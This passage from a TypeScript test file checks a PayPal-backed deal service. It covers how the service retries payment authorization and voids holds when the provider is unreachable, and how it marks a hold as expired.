    const waiting = await driveTo(session, dealId, "awaiting_payment");
    const orderId = waiting.payment?.orderId ?? "";
    await simulator.approve(orderId);
    const offline: ServiceContext = { ...ctx, provider: providerWith({ authorizeOrder: unreachable }) };

    expect((await completePayPalApproval(offline, { dealId, orderId })).outcome).toBe("pending");
    const between = await getDealView(ctx, session, dealId);
    expect(between).toMatchObject({ status: "awaiting_payment", payment: { status: "approved", authorizedMinor: 0 } });
    expect(events(between, "payment.approved")).toHaveLength(1);

    expect((await completePayPalApproval(ctx, { dealId, orderId })).outcome).toBe("authorized");
    const after = await getDealView(ctx, session, dealId);
    expect(after).toMatchObject({ status: "authorized", lastError: null, payment: { status: "authorized", authorizedMinor: 4700 } });
    expect(events(after, "payment.approved")).toHaveLength(1);
    expect(await ledger(dealId)).toEqual(["create_order:succeeded:1", "authorize:succeeded:2"]);
  });
});

/* -------------------------------------------------------------------------- */
/*  Releasing the hold                                                         */
/* -------------------------------------------------------------------------- */

describe("releasing a rejected delivery's hold", () => {
  it("stays in 'rejecting' while PayPal cannot be reached, then releases", async () => {
    const { session, dealId } = await open("injection");
    await driveTo(session, dealId, "in_review");
    await decideDeal(ctx, session, dealId, { kind: "reject_delivery" });
    const offline: ServiceContext = { ...ctx, provider: providerWith({ voidAuthorization: unreachable }) };

    const stuck = await advanceDeal(offline, session, dealId, APP_URL);
    expect(stuck).toMatchObject({ executed: null, deal: { status: "rejecting", payment: { status: "authorized" } } });
    expect(stuck.deal.lastError).toContain("NETWORK_ERROR");

    const done = await advanceDeal(ctx, session, dealId, APP_URL);
    expect(done).toMatchObject({ executed: "void", deal: { status: "rejected", lastError: null, payment: { status: "voided", capturedMinor: 0 } } });
    expect(await ledger(dealId)).toContain("void:succeeded:2");
  });

  it("a hold PayPal already released on its own ends the deal as expired at the next step", async () => {
    const { session, dealId } = await open("happy-path");
    const authorized = await driveTo(session, dealId, "authorized");
    // What a reconciliation would record after finding the authorization voided at PayPal.
    await db.update(payments).set({ status: "expired" }).where(eq(payments.dealId, dealId));

    const result = await advanceDeal(ctx, session, dealId, APP_URL);
    expect(result).toMatchObject({ executed: null, busy: false, deal: { status: "expired", submissions: [], next: { kind: "done" } } });
    expect(result.deal.audit).toHaveLength(authorized.audit.length + 1);
    expect(result.deal.audit[result.deal.audit.length - 1]).toMatchObject({ type: "deal.expired", actor: "system" });
  });
});
